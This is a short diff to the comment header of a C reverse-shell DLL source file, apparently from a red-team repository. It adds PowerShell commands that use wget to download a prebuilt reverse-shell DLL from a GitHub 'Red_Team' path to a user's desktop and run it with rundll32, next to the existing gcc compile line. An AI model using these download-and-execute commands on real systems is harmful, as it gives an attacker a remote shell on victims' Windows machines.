@@ -1,5 +1,9 @@
 //to compile: --> 
 //gcc -shared -lws2_32 -o dll_rev_shell.dll dll_rev_shell.c
+//PS commands:
+//wget "https://github.com/BankSecurity/Red_Team/blob/master/Reverse_Shell/Dll_Rev_Shell.dll?raw=true" -o C:\Users\Marco\Desktop\rev.dll
+//rundll32 rev.dll,main
+
 //#include "pch.h"
 #include "stdlib.h"
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
